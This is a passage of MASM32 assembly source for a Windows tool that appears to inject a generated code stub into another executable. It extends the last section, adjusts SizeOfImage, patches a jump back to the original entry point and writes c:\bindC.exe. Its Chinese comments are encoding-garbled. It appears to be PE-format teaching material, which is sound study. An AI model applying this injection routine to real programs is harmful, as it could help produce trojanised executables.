  ;��ȡ���һ���ڵ�VirtualAddress
  add eax,dwVirtualAddress
  mov [edi].OptionalHeader.SizeOfImage,eax  
  

  ;�������������е�E9ָ���Ĳ�����  
  mov eax,lpDstMemory
  add eax,dwNewFileAlignSize
  add eax,dwPatchCodeSize

  sub eax,5   ;EAXָ����E9�Ĳ�����
  mov edi,eax

  sub eax,lpDstMemory
  add eax,4

  mov ebx,dwDstEntryPoint
  invoke _OffsetToRVA,lpDstMemory,eax
  sub ebx,eax
  mov dword ptr [edi],ebx

  pushad
  invoke wsprintf,addr szBuffer,addr szOut112,ebx
  invoke _appendInfo,addr szBuffer    
  popad
  
  ;�����ļ�����д�뵽c:\bindC.exe
  invoke writeToExeFile,lpDstMemory,dwNewFileSize
 
  jmp _ErrorExit  ;�����˳�

_ErrFormat:
          invoke MessageBox,hWinMain,offset szErrFormat,NULL,MB_OK
_ErrorExit:
          pop fs:[0]
          add esp,0ch
          invoke UnmapViewOfFile,@lpMemory
          invoke CloseHandle,@hMapFile
          invoke CloseHandle,@hFile
          jmp @F
_ErrFormat1:
          invoke MessageBox,hWinMain,offset szErrFormat,NULL,MB_OK
_ErrorExit1:
          pop fs:[0]
          add esp,0ch
          invoke UnmapViewOfFile,@lpMemory1
          invoke CloseHandle,@hMapFile1
          invoke CloseHandle,@hFile1
@@:        
  ret
_createMessage endp

_addCode proc
  local @dwCount
  pushad

  mov ecx,dwNumber
  mov edi,offset szMessageFile
  add edi,lpMessageCodeStart

  mov dwCodeCount,0

  mov ecx,0
  ;ѭ���������е�ÿһ��
  .repeat
    inc ecx
    ;����������
    pushad
    invoke RtlZeroMemory,addr szBuffer,512
    popad
    ;��ȡ��ֵ
    invoke _GetListViewItem,hProcessModuleTable,ecx,1,addr szBuffer
    push ecx
    invoke atodw,addr szBuffer
    pop ecx
    ;д��ָ����
    mov ebx,offset szCode1_msg
    mov byte ptr [ebx],al
    
    ;����������
    pushad
    invoke RtlZeroMemory,addr szBuffer,512
    popad
    ;��ȡ�ӳ�ֵ
    invoke _GetListViewItem,hProcessModuleTable,ecx,2,addr szBuffer
    push ecx
    invoke atodw,addr szBuffer
    pop ecx
    ;д��ָ����
    mov ebx,offset szCode1_delay
    mov dword ptr [ebx],eax

    ;����ָ���ֽڵ�_Message��
    push ecx
    mov esi,offset szCode1
    mov ecx,szCode1Size
    rep movsb
    mov ecx,szCode1Size
    add dwCodeCount,ecx
    pop ecx

    .break .if ecx==dwNumber
  .until FALSE

  ;��dwCodeCount����5�ֽڶ��룬������ֽڲ�90h����nopָ��
  mov eax,dwCodeCount
  mov ecx,5
  invoke _align
  sub eax,dwCodeCount
  xchg ecx,eax
  mov al,90h
  rep stosb


  ;�����ļ�����д�뵽c:\bindC.exe
  invoke writeToFile,addr szMessageFile,MESSAGE_EXE_SIZE

  popad
  ret
_addCode endp

;-------------------
; �������ڳ���
;-------------------
_resultProcMain   proc  uses ebx edi esi hProcessModuleDlg:HWND,wMsg,wParam,lParam
          mov eax,wMsg

          .if eax==WM_CLOSE
             invoke EndDialog,hProcessModuleDlg,NULL
          .elseif eax==WM_INITDIALOG
             invoke GetDlgItem,hProcessModuleDlg,IDC_MODULETABLE
             mov hProcessModuleTable,eax
             invoke GetDlgItem,hProcessModuleDlg,ID_TEXT1
             mov hText1,eax
             invoke GetDlgItem,hProcessModuleDlg,ID_TEXT2
             mov hText2,eax

             invoke SendMessage,hProcessModuleTable,LVM_SETEXTENDEDLISTVIEWSTYLE,\
                    0,LVS_EX_GRIDLINES or LVS_EX_FULLROWSELECT
             invoke ShowWindow,hProcessModuleTable,SW_SHOW
             invoke _clearResultView

          .elseif eax==WM_NOTIFY
            mov eax,lParam
            mov ebx,lParam
            ;���ĸ��ؼ�״̬
            mov eax,[eax+NMHDR.hwndFrom]
            .if eax==hProcessModuleTable
                mov ebx,lParam
                .if [ebx+NMHDR.code]==NM_CUSTOMDRAW  ;�滭ʱ
                  mov ebx,lParam
                  assume ebx:ptr NMLVCUSTOMDRAW  
                  .if [ebx].nmcd.dwDrawStage==CDDS_PREPAINT
                     invoke SetWindowLong,hProcessModuleDlg,DWL_MSGRESULT,CDRF_NOTIFYITEMDRAW
                     mov eax,TRUE
                  .elseif [ebx].nmcd.dwDrawStage==CDDS_ITEMPREPAINT

                     invoke _GetListViewItem,hProcessModuleTable,[ebx].nmcd.dwItemSpec,1,\
                        addr bufTemp1
                     invoke _GetListViewItem,hProcessModuleTable,[ebx].nmcd.dwItemSpec,2,\
                        addr bufTemp2
                     invoke lstrlen,addr bufTemp1
                     invoke _MemCmp,addr bufTemp1,addr bufTemp2,eax
                     
                     .if eax==1
                        mov [ebx].clrTextBk,0a0a0ffh
                     .else
                        mov [ebx].clrTextBk,0ffffffh
                     .endif
                     invoke SetWindowLong,hProcessModuleDlg,DWL_MSGRESULT,CDRF_DODEFAULT
                     mov eax,TRUE
                   .endif
                .elseif [ebx+NMHDR.code]==NM_CLICK
                    assume ebx:ptr NMLISTVIEW
                .endif
            .endif
          .elseif eax==WM_COMMAND
             mov eax,wParam
             .if ax==IDC_OK  ;ˢ��
                ;�����ڱ��⸴�Ƶ�_Message.exe���ʵ�λ��
                invoke RtlZeroMemory,addr szBuffer,512
                invoke GetDlgItemText,hProcessModuleDlg,ID_TEXT3,addr szBuffer,512  
                invoke lstrlen,addr szBuffer
                xchg eax,ecx
                mov edi,offset szMessageFile
                add edi,lpMessageDataStart
                mov esi,offset szBuffer
                rep movsb
                mov al,0
                stosb
                ;��ӷ�����Ϣ�Ĵ���
                invoke _addCode
                invoke _createMessage
             .elseif ax==IDC_BROWSE1
                invoke _createMessage1
             .elseif ax==IDC_BROWSE2
                invoke _createMessage2
             .elseif ax==IDC_ADD   ;����
                ;��ȡ��ֵ
                invoke RtlZeroMemory,addr bufTemp1,200
                invoke GetDlgItemText,hProcessModuleDlg,ID_TEXT4,addr bufTemp1,200
                ;��ȡ��ʱ
                invoke RtlZeroMemory,addr bufTemp2,200
                invoke GetDlgItemText,hProcessModuleDlg,ID_TEXT5,addr bufTemp2,200
                ;����һ��
                invoke _addLine

             .elseif ax==IDC_DEL   ;��ձ������
                invoke _ListViewClear,hProcessModuleTable
                invoke _clearResultView
                mov dwNumber,0
             .endif
         .else
             mov eax,FALSE
             ret
         .endif
         mov eax,TRUE
         ret
_resultProcMain    endp

;-------------------
; ���ڳ���
;-------------------
_ProcDlgMain proc uses ebx edi esi hWnd,wMsg,wParam,lParam
  mov eax,wMsg
  .if eax==WM_CLOSE
    invoke EndDialog,hWnd,NULL
  .elseif eax==WM_INITDIALOG  ;��ʼ��
    push hWnd
    pop hWinMain
    call _init
  .elseif eax==WM_COMMAND     ;�˵�
    mov eax,wParam
    .if eax==IDM_EXIT       ;�˳�
      invoke EndDialog,hWnd,NULL 
    .elseif eax==IDM_OPEN   ;���ļ�
         invoke DialogBoxParam,hInstance,RESULT_MODULE,hWnd,\
               offset _resultProcMain,0
         invoke InvalidateRect,hWnd,NULL,TRUE
         invoke UpdateWindow,hWnd
    .elseif eax==IDM_1  

    .elseif eax==IDM_2

    .elseif eax==IDM_3

    .endif
  .else
    mov eax,FALSE
    ret
  .endif
  mov eax,TRUE
  ret
_ProcDlgMain endp

start:
  mov dwNumber,0
  invoke InitCommonControls
  invoke LoadLibrary,offset szDllEdit
  mov hRichEdit,eax
  invoke GetModuleHandle,NULL
  mov hInstance,eax
  invoke DialogBoxParam,hInstance,\
         DLG_MAIN,NULL,offset _ProcDlgMain,NULL
  invoke FreeLibrary,hRichEdit
  invoke ExitProcess,NULL
  end start



